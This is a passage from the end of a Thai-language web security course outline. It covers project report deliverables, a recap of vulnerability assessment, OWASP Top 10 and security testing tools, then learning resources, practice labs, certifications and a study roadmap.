   - Raw scan results
   - Code samples
   - References
```

##### 3. แผนการแก้ไข
- แผนงานระยะสั้น (1-3 เดือน)
- แผนงานระยะยาว (3-12 เดือน)
- Resource requirements
- Success metrics

##### 4. Demo Presentation (10-15 นาที)
- สาธิตช่องโหว่ที่พบ
- แสดงการใช้งานเครื่องมือ
- Present key findings
- Q&A session

---

## 📚 สรุปบทเรียนทั้งหมด

### 🎯 ความรู้ที่ได้รับ

#### Fundamentals
- **Vulnerabilities:** ความหมาย ประเภท และตัวอย่าง
- **CVE System:** การใช้งานและการอ้างอิง
- **Risk Assessment:** การประเมินและจัดการความเสี่ยง
- **CVSS:** การให้คะแนนความรุนแรง

#### OWASP Top 10
- **A01-A10:** ช่องโหว่ที่สำคัญที่สุด 10 อันดับ
- **Code Examples:** ตัวอย่าง vulnerable และ secure code
- **Mitigation Strategies:** วิธีการป้องกันแต่ละประเภท

#### Security Testing
- **SAST/DAST/SCA/IAST:** เครื่องมือและเทคนิคต่างๆ
- **Tools Mastery:** ZAP, Burp Suite, SonarQube, Snyk
- **Advanced Techniques:** Fuzzing, Penetration Testing, API Security

#### DevSecOps
- **CI/CD Integration:** การรวม Security เข้า Pipeline
- **Security Gates:** การควบคุมคุณภาพ
- **Automation:** การทำ Security Testing แบบอัตโนมัติ

### 🚀 การประยุกต์ใช้ในโลกจริง

#### สำหรับนักพัฒนา
- ใช้ OWASP Top 10 เป็น security checklist
- รวม security testing เข้า development lifecycle
- ใช้เครื่องมือ automated scanning ในทีม
- ทำ manual testing เป็นระยะ

#### สำหรับองค์กร
- ติดตาม CVE updates อย่างสม่ำเสมอ
- สร้างวัฒนธรรม Security-First
- Training ทีมพัฒนาเรื่อง Security
- Implement Security Policies

### 📚 Resources สำหรับศึกษาต่อ

#### Official Resources
- **OWASP:** [owasp.org](https://owasp.org)
  - OWASP Top 10
  - Web Security Testing Guide
  - Code Review Guide
- **CVE:** [cve.mitre.org](https://cve.mitre.org)
- **NVD:** [nvd.nist.gov](https://nvd.nist.gov)

#### Training Platforms
- **SANS:** [sans.org](https://sans.org) - Security training และ certification
- **PortSwigger Academy:** [portswigger.net/web-security](https://portswigger.net/web-security)
- **TryHackMe:** [tryhackme.com](https://tryhackme.com)
- **HackTheBox:** [hackthebox.eu](https://hackthebox.eu)

#### Practice Labs
- **DVWA:** Damn Vulnerable Web Application
- **WebGoat:** OWASP WebGoat
- **Juice Shop:** OWASP Juice Shop
- **VulnHub:** [vulnhub.com](https://vulnhub.com)

#### Communities
- **Reddit:** r/netsec, r/AskNetsec
- **Security Twitter:** Follow security researchers
- **OWASP Local Chapters:** เข้าร่วม meetups
- **Security Conferences:** BSides, DEF CON, Black Hat

#### Certifications
- **CEH:** Certified Ethical Hacker
- **OSCP:** Offensive Security Certified Professional
- **CISSP:** Certified Information Systems Security Professional
- **Security+:** CompTIA Security+
- **GSEC:** GIAC Security Essentials

---

## 🎯 การต่อยอดและพัฒนาต่อ

### ระยะสั้น (1-3 เดือน)
1. **Practice Labs:** ทำ DVWA, WebGoat, Juice Shop
2. **Tool Mastery:** เชี่ยวชาญ ZAP และ Burp Suite
3. **Code Review:** ฝึกหา vulnerabilities ใน code
4. **OWASP Study:** อ่าน OWASP guides อย่างละเอียด

### ระยะกลาง (3-6 เดือน)
1. **Advanced Tools:** เรียนรู้ Metasploit, Nessus
2. **API Security:** ทำความเข้าใจ API security testing
3. **Cloud Security:** ศึกษา AWS/Azure/GCP security
4. **Automation:** สร้าง security automation scripts

### ระยะยาว (6-12 เดือน)
1. **Certification:** เตรียมสอบ CEH หรือ OSCP
2. **Research:** ติดตาม latest security research
3. **Bug Bounty:** เข้าร่วม bug bounty programs
4. **Community:** มีส่วนร่วมใน security community

---

## 🏆 สรุป

การเรียนรู้เรื่อง **Vulnerability Assessment**, **OWASP Top 10**, และ **Security Testing Tools** เป็นพื้นฐานที่สำคัญสำหรับนักพัฒนาในยุคปัจจุบัน

**Security is not a product, it's a process** - การรักษาความปลอดภัยไม่ใช่สิ่งที่ทำครั้งเดียวแล้วเสร็จ แต่เป็นกระบวนการต่อเนื่องที่ต้องปรับปรุงและพัฒนาอยู่ตลอดเวลา

### 🛡️ Remember
- **Security is Everyone's Responsibility**
- **Think Like an Attacker, Build Like a Defender**
- **Continuous Learning is Key**
- **Practice Makes Perfect**

---

**🎉 ขอบคุณและพร้อมสู่การเป็น Security Champion! 💪🛡️**